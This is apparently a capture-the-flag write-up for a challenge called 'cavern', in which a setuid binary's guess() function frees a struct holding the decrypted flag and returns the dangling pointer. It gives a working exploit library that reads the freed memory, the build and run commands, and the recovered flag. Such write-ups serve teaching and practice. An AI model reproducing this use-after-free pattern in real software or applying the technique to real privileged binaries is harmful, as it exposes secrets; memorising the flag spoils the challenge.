# cctf — cavern (100 points)

**Flag:** `cctf{rem3mB3r_tH3R3_is_no_Sp0oN_Fr3e_fr0M_n45a1_dem0ns}`

## Task

Container: `ssh t.zainullin-cavern@osctf.nnk.moe` (password from the bot).
Inside there is a setuid-root binary `cavern`. The bot instructions:

1. Write a C file (e.g. `offer.c`) that exports `void run(void)`.
2. Build: `gcc -shared -fPIC -o offer.so offer.c -ldl`
3. Run: `./cavern ./offer.so`

The cavern source (`cavern.c`, attached by the bot) loads our `.so` and calls
`run()`. Its function `guess()`:

```c
void* guess(char* your_guess) {
    struct offering* offering = offering_new();      /* calloc(1, 128) */
    offering_set_guess(offering, your_guess);
    offering_set_secret(offering);                   /* ->secret = flag (XOR-decoded) */
    ... check, print "Wrong, the demons cackle." ...
    offering_free(offering);                         /* free(offering) */
    return offering;                                 /* !!! returns freed pointer */
}
```

## Idea

Classic **use-after-free**: the decrypted flag is written into `offering->secret`,
then the struct is `free()`d — but freed memory keeps its content, and the
dangling pointer is returned to the caller. "You just need to remember it."
Our `run()` calls `guess()` (a global symbol of the main binary, resolvable from
a `dlopen`ed library) and reads the secret out of the freed chunk.

## Solution

`offer.c` (dump version — prints every printable byte of the freed struct):

```c
#include <stdio.h>
#include <stdlib.h>

extern void* guess(char* your_guess);

void run(void) {
    void* p = guess("we-come-in-peace");
    if (p == NULL) { printf("no offering returned\n"); return; }
    unsigned char* m = (unsigned char*)p;
    printf("HEIST dump: ");
    for (int i = 0; i < 128; i++)
        if (m[i] >= 32 && m[i] < 127)
            putchar(m[i]);
    putchar('\n');
    fflush(stdout);
}
```

Commands (inside the container):

```
gcc -shared -fPIC -o offer.so offer.c -ldl
./cavern ./offer.so
```

Output:

```
"Wrong," the demons cackle. "Again!"
HEIST dump: +NJncctf{rem3mB3r_tH3R3_is_no_Sp0oN_Fr3e_fr0M_n45a1_dem0ns}
```

(The first bytes are the remains of our guess string, then the flag from
`secret[64..118]`.)

## Result

```
✅ Flag accepted for 'cavern'.   100 points
```
